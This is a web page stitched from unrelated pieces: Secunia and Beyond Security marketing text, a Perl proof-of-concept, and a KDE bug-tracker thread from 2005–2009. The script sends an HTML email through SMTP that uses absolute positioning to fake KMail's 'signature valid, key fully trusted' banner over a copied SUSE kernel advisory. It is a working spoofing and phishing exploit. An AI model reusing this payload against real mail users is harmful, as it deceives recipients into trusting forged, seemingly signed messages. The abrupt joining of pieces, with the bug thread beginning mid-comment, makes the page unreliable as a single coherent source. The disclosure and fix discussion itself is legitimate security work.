How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

Perquisites: 1) HTML needs to be enabled - frequently people just enable HTML support 2) The color scheme needs to be guessed, if it has been changed from the default - not frequent  Don't affect the vulnerability: 1) Adding the HTML warning tab on the left side of the email, just because its there, you don't think it's a spoofed email  Exploit: #!/usr/bin/perl -w # # By Noam Rathaus - Beyond Security  use IO::Socket; use strict;  my $Host = shift;  my $remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $Host, PeerPort => "smtp");  unless ($remote) { die "cannot connect to SMTP daemon on $Host" }  print "connected\n";  waitfor($remote, "220 ");  print "HELO\n"; print $remote "HELO whatever.com\r\n";  waitfor($remote, "250 ");  print "MAIL FROM\n"; print $remote "MAIL FROM: test\@whoever.com\r\n";  waitfor($remote, "250 ");  print "RCPT TO\n"; print $remote "RCPT TO: testy\@whoever.com\r\n";  waitfor($remote, "250 ");  print "DATA\n"; print $remote "DATA\r\n";  waitfor($remote, "354 ");  print $remote <<_EOF_; From: newone\@whoever.com\r Subject: Test Case\r To: oldone\@whoever.com\r Date: Mon, 27 Dec 2004 01:43:24 -0600\r MIME-version: 1.0\r Content-type: text/html; charset="utf8"\r Content-transfer-encoding: 8bit\r \r <HTML>\r <BODY>\r <BR>\r <SPAN STYLE="font-family: arial; position: absolute; left: 0px; top: 0px; background: white; width: 99%; margin-left: 10px; margin-top: 10px;">\r <TABLE STYLE="width: 100%; background: white; border: 1px solid; margin-left: auto; margin-right: auto;" CELLSPACING="0" CELLPADDING="2">\r  <TR>\r   <TD COLSPAN="2" STYLE="background: #ffdd76;"><B>Microsoft Alert</B></TD>\r  </TR>\r  <TR STYLE="background: #eeeee6;">\r   <TD WIDTH="1"><B>From:</B></TD><TD><A HREF="mailto:suse\@suse.com">suse\@suse.com</A></TD>\r  </TR>\r  <TR STYLE="background: #eeeee6;">\r   <TD><B>To:</B></TD><TD><A HREF="mailto:test\@whoever.com">test\@whoever.com</A></TD>\r  </TR>\r  <TR STYLE="background: #eeeee6;">\r   <TD><B>Date:</B></TD><TD>2004-12-27 09:43</TD>\r  </TR>\r </TABLE>\r <BR>\r <TABLE STYLE="width: 99%; margin-left: 10px; background: white; border: 1px solid; border-color: #40FF40; margin-left: auto; margin-right: auto;" CELLSPACING="0" CELLPADDING="2">  <TR>\r   <TD STYLE="background: #40FF40;"><B>Message was signed by <A HREF="mailto:security\@suse.de">SuSE Security Team &lt;security\@suse.de&gt;</A> (Key ID: 0x3D25D3D9).<BR>   The signature is valid and the key is fully trusted.</B></TD>\r  </TR>\r  <TR>   <TD STYLE="background: #e8ffe8;"> <PRE>______________________________________________________________________________                          SUSE Security Announcement          Package:                kernel         Announcement-ID:        SUSE-SA:2004:046         Date:                   Wednesday, Dec 22nd 2004 16:00 MEST         Affected products:      9.0 / AMD64                                 SUSE Linux Enterprise Server 8 / AMD64         Vulnerability Type:     local privilege escalation         Severity (1-10):        8         SUSE default package:   yes         Cross References:       CAN-2004-1144      Content of this advisory:         1) security vulnerability resolved:              - local root exploit in 2.4 AMD64 kernel            problem description         2) solution/workaround         3) special instructions and notes         4) package location and checksums         5) pending vulnerabilities, solutions, workarounds:             - see SUSE Security Summary         6) standard appendix (further information)  ______________________________________________________________________________  1) problem description, brief discussion      Due to missing argument checking in the 32 bit compatibility     system call handler in the 2.4 Linux Kernel on the AMD64 platform     a local attacker can gain root access using a simple program.      This issue was found and fixed by Petr Vandrovec and has been     assigned the Mitre CVE ID CAN-2004-1144.      This is a 2.4 Kernel and AMD64 specific problem, other     architectures and the 2.6 Kernel are not affected.   2) solution/workaround      There is no workaround, please install the supplied kernels.  3) special instructions and notes      SPECIAL INSTALL INSTRUCTIONS:     ==============================     The following paragraphs will guide you through the installation     process in a step-by-step fashion. The character sequence "****"     marks the beginning of a new paragraph. In some cases, the steps     outlined in a particular paragraph may or may not be applicable     to your situation.     Therefore, please make sure to read through all of the steps below     before attempting any of these procedures.     All of the commands that need to be executed are required to be     run as the superuser (root). Each step relies on the steps before     it to complete successfully.     **** Step 1: Determine the needed kernel type      Please use the following command to find the kernel type that is     installed on your system:        rpm -qf /boot/vmlinuz      Following are the possible kernel types (disregard the version and     build number following the name separated by the "-" character)        k_deflt   # default kernel, good for most systems.       k_i386    # kernel for older processors and chip sets       k_athlon  # kernel made specifically for AMD Athlon(tm) family processors       k_psmp    # kernel for Pentium-I dual processor systems       k_smp     # kernel for SMP systems (Pentium-II and above)       k_smp4G   # kernel for SMP systems which supports a maximum of 4G of RAM       kernel-64k-pagesize       kernel-bigsmp       kernel-default       kernel-smp    **** Step 2: Download the package for your system      Please download the kernel RPM package for your distribution with the     name as indicated by Step 1. The list of all kernel rpm packages is     appended below. Note: The kernel-source package does not     contain a binary kernel in bootable form. Instead, it contains the     sources that the binary kernel rpm packages are created from. It can be     used by administrators who have decided to build their own kernel.     Since the kernel-source.rpm is an installable (compiled) package that     contains sources for the linux kernel, it is not the source RPM for     the kernel RPM binary packages.      The kernel RPM binary packages for the distributions can be found at the     locations below ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64.      After downloading the kernel RPM package for your system, you should     verify the authenticity of the kernel rpm package using the methods as     listed in section 3) of each SUSE Security Announcement.     **** Step 3: Installing your kernel rpm package      Install the rpm package that you have downloaded in Steps 3 or 4 with     the command         rpm -Uhv --nodeps --force &lt;K_FILE.RPM&gt;     where &lt;K_FILE.RPM&gt; is the name of the rpm package that you downloaded.      Warning: After performing this step, your system will likely not be              able to boot if the following steps have not been fully              followed.       If you run SUSE LINUX 8.1 and haven't applied the kernel update     (SUSE-SA:2003:034), AND you are using the freeswan package, you also     need to update the freeswan rpm as a dependency as offered     by YOU (YaST Online Update). The package can be downloaded from     ftp://ftp.suse.com/pub/suse/i386/update/8.1/rpm/i586/    **** Step 4: configuring and creating the initrd      The initrd is a ramdisk that is loaded into the memory of your     system together with the kernel boot image by the bootloader. The     kernel uses the content of this ramdisk to execute commands that must     be run before the kernel can mount its actual root filesystem. It is     usually used to initialize SCSI drivers or NIC drivers for diskless     operation.      The variable INITRD_MODULES in /etc/sysconfig/kernel determines     which kernel modules will be loaded in the initrd before the kernel     has mounted its actual root filesystem. The variable should contain     your SCSI adapter (if any) or filesystem driver modules.      With the installation of the new kernel, the initrd has to be     re-packed with the update kernel modules. Please run the command        mk_initrd      as root to create a new init ramdisk (initrd) for your system.     On SuSE Linux 8.1 and later, this is done automatically when the     RPM is installed.     **** Step 5: bootloader      If you run a SUSE LINUX 8.x, SLES8, or SUSE LINUX 9.x system, there     are two options:     Depending on your software configuration, you have either the lilo     bootloader or the grub bootloader installed and initialized on your     system.     The grub bootloader does not require any further actions to be     performed after the new kernel images have been moved in place by the     rpm Update command.     If you have a lilo bootloader installed and initialized, then the lilo     program must be run as root. Use the command        grep LOADER_TYPE /etc/sysconfig/bootloader      to find out which boot loader is configured. If it is lilo, then you     must run the lilo command as root. If grub is listed, then your system     does not require any bootloader initialization.      Warning: An improperly installed bootloader may render your system              unbootable.    **** Step 6: reboot      If all of the steps above have been successfully completed on your     system, then the new kernel including the kernel modules and the     initrd should be ready to boot. The system needs to be rebooted for     the changes to become active. Please make sure that all steps have     completed, then reboot using the command         shutdown -r now     or         init 6      Your system should now shut down and reboot with the new kernel.   4) package location and checksums      Please download the update package for your distribution and verify its     integrity by the methods listed in section 3) of this announcement.     Then, install the package using the command "rpm -Fhv file.rpm" to apply     the update.     Our maintenance customers are being notified individually. The packages     are being offered to install from the maintenance web.      x86-64 Platform:      SUSE Linux 9.0:     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/k_deflt-2.4.21-268.x86_64.rpm       585c7dd47f8e6f9e60ae4eed5fbb21fe     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/k_smp-2.4.21-268.x86_64.rpm       44b0c5e8beae0d1b60b85f0f1406a4f9     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/x86_64/kernel-source-2.4.21-268.x86_64.rpm       000194dc37b15a93c8b0313288c9c879     source rpm(s):     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/k_deflt-2.4.21-268.src.rpm       3f0a9d938251f2d72fce0ccc979c19a1     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/k_smp-2.4.21-268.src.rpm       33b072ab6ef6333f42bda07a5de7e658     ftp://ftp.suse.com/pub/suse/x86_64/update/9.0/rpm/src/kernel-source-2.4.21-268.src.rpm       772c469c0907594d6396918a5d4c91f6 ______________________________________________________________________________  5)  Pending vulnerabilities in SUSE Distributions and Workarounds:      See the SUSE Security Summary Report for more information.  ______________________________________________________________________________  6)  standard appendix: authenticity verification, additional information    - Package authenticity verification:      SUSE update packages are available on many mirror ftp servers all over     the world. While this service is being considered valuable and important     to the free and open source software community, many users wish to be     sure about the origin of the package and its content before installing     the package. There are two verification methods that can be used     independently from each other to prove the authenticity of a downloaded     file or rpm package:     1) md5sums as provided in the (cryptographically signed) announcement.     2) using the internal gpg signatures of the rpm package.      1) execute the command         md5sum &lt;name-of-the-file.rpm&gt;        after you downloaded the file from a SUSE ftp server or its mirrors.        Then, compare the resulting md5sum with the one that is listed in the        announcement. Since the announcement containing the checksums is        cryptographically signed (usually using the key security\@suse.de),        the checksums show proof of the authenticity of the package.        We disrecommend to subscribe to security lists which cause the        email message containing the announcement to be modified so that        the signature does not match after transport through the mailing        list software.        Downsides: You must be able to verify the authenticity of the        announcement in the first place. If RPM packages are being rebuilt        and a new version of a package is published on the ftp server, all        md5 sums for the files are useless.      2) rpm package signatures provide an easy way to verify the authenticity        of an rpm package. Use the command         rpm -v --checksig &lt;file.rpm&gt;        to verify the signature of the package, where &lt;file.rpm&gt; is the        filename of the rpm package that you have downloaded. Of course,        package authenticity verification can only target an un-installed rpm        package file.        Prerequisites:         a) gpg is installed         b) The package is signed using a certain key. The public part of this            key must be installed by the gpg program in the directory            ~/.gnupg/ under the user's home directory who performs the            signature verification (usually root). You can import the key            that is used by SUSE in rpm packages for SUSE Linux by saving            this announcement to a file ("announcement.txt") and            running the command (do "su -" to be root):             gpg --batch; gpg &lt; announcement.txt | gpg --import            SUSE Linux distributions version 7.1 and thereafter install the            key "build\@suse.de" upon installation or upgrade, provided that            the package gpg is installed. The file containing the public key            is placed at the top-level directory of the first CD (pubring.gpg)            and at ftp://ftp.suse.com/pub/suse/pubring.gpg-build.suse.de .     - SUSE runs two security mailing lists to which any interested party may     subscribe:      suse-security\@suse.com         -   general/linux/SUSE security discussion.

In any case, the issue is two months old. Some sort of fix or response would be great.  Thanks. ```  [Comment 5](show_bug.cgi?id=96020#c5)  Dirk Mueller    2005-04-25 02:03:09 UTC  ``` it does affect kmail 3.4 the same way it affected all older versions. however, this proof of concept is pretty lame. it doesn't match the colors, the fonts or even the font sizes. of course you could theoretically tune for that.   it doesn't have the usual link to the status popup though, and its clearly mentioned in several places that HTML rendering has phishing problems, and  HTML rendering is *disabled* by *default* in kmail, and you get a pretty huge warning if you still enable it.   anyway, the html bar also indicates that this is a spoofed message. maybe not in an obvious way.   the only way we could mitigate this attack for real though is to load the actual content in a separate frame, so that it cannot paint over kmail  specific HTML. This is a long term todo, and there are a few bits missing in KHTML in order to achieve that.   so I'd either close it as wontfix or as duplicate, whatever you prefer.  ```  [Comment 6](show_bug.cgi?id=96020#c6)  Ana Guerrero (Debian KDE maintainers)    2005-04-25 03:24:30 UTC  ``` Well, perhaps keep it open, since this is a problem, just one not as serious as one might think at first glance.  Thanks for explaining the situation - it was very helpful.  Cheers. ```  [Comment 7](show_bug.cgi?id=96020#c7)  Noam Rathaus    2005-04-25 07:47:04 UTC  ``` The colors, fonts and font sizes all match my version of Kmail/KDE, not to mention that they can be customized to any requirements. The HTML Bar shouldn't appear if the font sizes match and the screen resolution is known, as it is overlapped by the HTML content, which is what the vulnerability is all about. Overlapping of critical information by HTML code. ```  [Comment 8](show_bug.cgi?id=96020#c8)  Dirk Mueller    2005-04-26 10:12:47 UTC  ``` I don't doubt that the colors/fonts etc match your settings of kmail, but they don't match mine, and thats probably true for a lot of people. so its not so easy to write a generic phishing this way.   Also, the html bar is not hidden for me here (KMail HEAD, but there haven't been changes in that area for ages. Probably 3.4 is not affected).   ```  [Comment 9](show_bug.cgi?id=96020#c9)  Thomas McGuire    2006-09-27 16:38:18 UTC  ``` IMHO the following are all duplicates of this bug:  [Bug #96557](show_bug.cgi?id=96557 "RESOLVED FIXED - Incorrect rendering of HTML messages that use absolute positioning") [Bug #109625](show_bug.cgi?id=109625 "RESOLVED DUPLICATE - absolute coordinates in CSS messes up HTML render in viewer") [Bug #123395](show_bug.cgi?id=123395 "RESOLVED DUPLICATE - Absolutely positioned HTML is offset by header.")  Someone with enough permissions please mark these bugs as such. ```  [Comment 10](show_bug.cgi?id=96020#c10)  Rex Dieter    2006-09-27 16:53:49 UTC  ``` FYI, just marked the latter 2 dups of the 1st.  Leaving 1st alone, for now, it already contains a reference to this. ```  [Comment 11](show_bug.cgi?id=96020#c11)  Ingo Klöcker    2006-09-27 22:50:50 UTC  ``` FWIW: The bar on the left side which can be enabled/disabled by the user in the configuration dialog and which either shows "No HTML Message" or "HTML Message" can't be overlapped by the HTML content. The HTML content is restricted to the KHTML widget and the side bar is a widget of its own. Thus overlapping is technically impossible. ```  [Comment 12](show_bug.cgi?id=96020#c12)  Dominik Tritscher    2008-09-14 20:44:49 UTC  ``` Just checked that with kmail from KDE4 trunk (r860647). The HTML warning is not overwritten by the testmail, but the rendering looks like a correctly signed massage. So basically this is still an issue, as long as the signing infos are rendered within the message itself. ```  [Comment 13](show_bug.cgi?id=96020#c13)  Jaime Torres    2009-01-17 12:54:25 UTC  ``` With the new messagelist there is allways information that says the message has a signature or not, or is encrypted or not, but I'm sure most users will only see the fancy rendering saying the mail is signed and the signature is valid.   To solve the phising, the way the signature information is shown must change a lot and must not be possible to simulate it with html mails (or the next great mail format with pretty colors).   And, very important, the users must be trained to not trust mail messages until they check the message is valid. I'm almost sure that if the exploit is seen with other mail clients, a lot of users will also trust the mail content.    ```  [Comment 14](show_bug.cgi?id=96020#c14)  Thomas McGuire    2009-03-16 14:45:58 UTC  ``` *** [Bug 48568](show_bug.cgi?id=48568 "RESOLVED DUPLICATE - css from mail are applied on nice headers") has been marked as a duplicate of this bug. *** ```  [Comment 15](show_bug.cgi?id=96020#c15)  Thomas McGuire    2009-03-16 17:25:56 UTC  ``` SVN commit 940115 by tmcguire:  Make sure HTMl messages can not overwrite the header.

## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.
